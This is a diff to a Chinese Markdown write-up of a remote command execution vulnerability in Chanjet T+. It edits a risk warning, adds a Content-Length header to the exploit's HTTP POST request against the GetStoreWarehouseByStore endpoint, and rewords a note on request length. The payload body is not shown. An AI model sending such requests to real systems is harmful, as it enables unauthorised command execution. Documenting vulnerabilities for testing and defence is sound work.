@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -70,6 +70,7 @@ POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetSt
 Host: 
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
 Connection: close
+Content-Length: 668
 X-Ajaxpro-Method: GetStoreWarehouseByStore
 Accept-Encoding: gzip
 
@@ -89,7 +90,7 @@ Accept-Encoding: gzip
 }
 ```
 
-> 请求长度说明：原资料 Content-Length 为 668；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 668；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20230704111653392](./.resource/用友-畅捷通T+-GetStoreWarehouseByStore-远程命令执行漏洞/media/image-20230704111653392.png)
 
